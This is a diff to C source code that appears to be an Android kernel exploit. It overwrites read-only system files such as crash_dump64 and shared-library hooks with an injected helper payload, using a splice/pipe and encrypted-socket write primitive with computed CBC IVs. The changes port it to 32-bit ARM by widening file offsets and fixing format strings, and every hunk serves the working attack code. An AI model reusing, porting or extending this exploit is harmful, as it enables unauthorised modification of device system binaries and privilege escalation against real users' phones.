@@ -68,10 +68,10 @@ static void compute_iv(const uint8_t old_content[16], const uint8_t desired[16],
  * Pass mode="r" for read, NULL for write-splice.
  * Returns waitpid status, or -1 if clone fails (already logged).
  */
-static int spawn_crash_dump(off_t offset, int write_fd, int target_fd, const char *mode)
+static int spawn_crash_dump(off64_t offset, int write_fd, int target_fd, const char *mode)
 {
     char offstr[24];
-    snprintf(offstr, sizeof(offstr), "%ld", (long)offset);
+    snprintf(offstr, sizeof(offstr), "%lld", (long long)offset);
     int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
     if (pid < 0) { printf("vfork failed: %s\n", strerror(errno)); return -1; }
     if (pid == 0) {
@@ -89,7 +89,7 @@ static int spawn_crash_dump(off_t offset, int write_fd, int target_fd, const cha
 
 /* Read 16 bytes from vendor file at offset using crash_dump bridge (read mode).
  */
-static int read_vendor_content(off_t offset, uint8_t buf[16]) {
+static int read_vendor_content(off64_t offset, uint8_t buf[16]) {
     int rdpipe[2];
     if (pipe(rdpipe) < 0) { printf("pipe failed: %s\n", strerror(errno)); return -1; }
 
@@ -110,14 +110,14 @@ static int read_vendor_content(off_t offset, uint8_t buf[16]) {
             };
             int ec = WEXITSTATUS(status);
             const char *meaning = (ec < 4) ? exit_meanings[ec] : "unknown";
-            printf("read_vendor at 0x%lx got %d bytes: %s\n",
-                     (long)offset, n, meaning);
+            printf("read_vendor at 0x%llx got %d bytes: %s\n",
+                     (long long)offset, n, meaning);
         } else if (WIFSIGNALED(status))
-            printf("read_vendor at 0x%lx got %d bytes: signal %d\n",
-                     (long)offset, n, WTERMSIG(status));
+            printf("read_vendor at 0x%llx got %d bytes: signal %d\n",
+                     (long long)offset, n, WTERMSIG(status));
         else
-            printf("read_vendor at 0x%lx got %d bytes: status 0x%x\n",
-                     (long)offset, n, status);
+            printf("read_vendor at 0x%llx got %d bytes: status 0x%x\n",
+                     (long long)offset, n, status);
         return -1;
     }
     return 0;
@@ -129,7 +129,7 @@ static int read_vendor_content(off_t offset, uint8_t buf[16]) {
  * use_helper=1: exec crash_dump64 (splicehelper splice mode) to put vendor page in pipe
  * sk_send: connected UDP socket, created once by patch_file_cbc and reused across writes.
  */
-static int do_one_write_cbc(int pipe_rd, int pipe_wr, int sk_send, int file_fd, off_t offset,
+static int do_one_write_cbc(int pipe_rd, int pipe_wr, int sk_send, int file_fd, off64_t offset,
                             const uint8_t iv[16], int use_helper) {
     uint8_t hdr[24];
     *(uint32_t *)(hdr + 0) = htonl(g_spi);
@@ -149,7 +149,10 @@ static int do_one_write_cbc(int pipe_rd, int pipe_wr, int sk_send, int file_fd, 
             return -1;
         }
     } else {
-        off_t off = offset;
+        /* splice() hands the kernel a loff_t*: it MUST be 8 bytes wide, even
+         * on arm32 where off_t is only 4. A 32-bit off_t here makes the
+         * kernel read stack garbage as the upper half -> EINVAL. */
+        off64_t off = offset;
         if (splice(file_fd, &off, pipe_wr, NULL, 16, SPLICE_F_MOVE) != 16) {
             printf("splice file failed: %s\n", strerror(errno)); return -1;
         }
@@ -213,7 +216,7 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
 
     int rc = 0;
     for (size_t i = 0; i < len / 16; i++) {
-        off_t off = (off_t)(foff + i * 16);
+        off64_t off = (off64_t)(foff + i * 16);
         uint8_t old_content[16] = {0};
 
         if (use_helper) {
@@ -221,8 +224,8 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
                 rc = -1; break;
             }
         } else {
-            if (pread(file_fd, old_content, 16, off) != 16) {
-                printf("pread at 0x%lx failed: %s\n", (long)off, strerror(errno));
+            if (pread64(file_fd, old_content, 16, off) != 16) {
+                printf("pread at 0x%llx failed: %s\n", (long long)off, strerror(errno));
                 rc = -1; break;
             }
         }
@@ -234,7 +237,7 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
         compute_iv(old_content, desired, iv);
 
         if (do_one_write_cbc(pfd[0], pfd[1], sk_send, file_fd, off, iv, use_helper) < 0) {
-            printf("write #%zu at 0x%lx failed\n", i, (long)off);
+            printf("write #%zu at 0x%llx failed\n", i, (long long)off);
             rc = -1; break;
         }
     }
@@ -351,7 +354,7 @@ static int patch_helper(void) {
     char *buf = pad16(splice_helper_start,
                       (size_t)(splice_helper_end - splice_helper_start), &len);
     if (!buf) { printf("patch: crash_dump64 - pad16 alloc failed\n"); return -1; }
-    printf("patch: crash_dump64 <- splicehelper (%zu bytes)\n", len);
+    printf("patch: %s <- splicehelper (%zu bytes)\n", kCrashDump, len);
     int ret = patch_file_cbc(kCrashDump, buf, len, 0, 0);
     if (ret) { free(buf); printf("patch: crash_dump64 patch failed: %d\n", ret); return ret; }
 
@@ -361,7 +364,7 @@ static int patch_helper(void) {
         ssize_t n = pread(vfd, verify, 16, 16);
         close(vfd);
         if (n == 16 && memcmp(verify, buf + 16, 16) != 0) {
-            printf("patch: crash_dump64 verification failed\n");
+            printf("patch: %s verification failed\n", kCrashDump);
             printf("patch: DEVICE NOT VULNERABLE\n");
             free(buf);
             return -1;
@@ -519,8 +522,8 @@ static int patch_hook(const char *lib, const char *sym,
 
     int fd = open(lib, O_RDONLY);
     if (fd < 0) { printf("open %s failed: %s\n", lib, strerror(errno)); free(buf); return -1; }
-    int ok = pread(fd, restore->shell_orig, padded,  (off_t)shell_off) == (ssize_t)padded
-          && pread(fd, restore->tramp_orig, blk_len, (off_t)aligned)  == (ssize_t)blk_len;
+    int ok = pread64(fd, restore->shell_orig, padded,  (off64_t)shell_off) == (ssize_t)padded
+          && pread64(fd, restore->tramp_orig, blk_len, (off64_t)aligned)  == (ssize_t)blk_len;
     close(fd);
     if (!ok) { printf("pread %s save failed\n", lib); free(buf); return -1; }
 
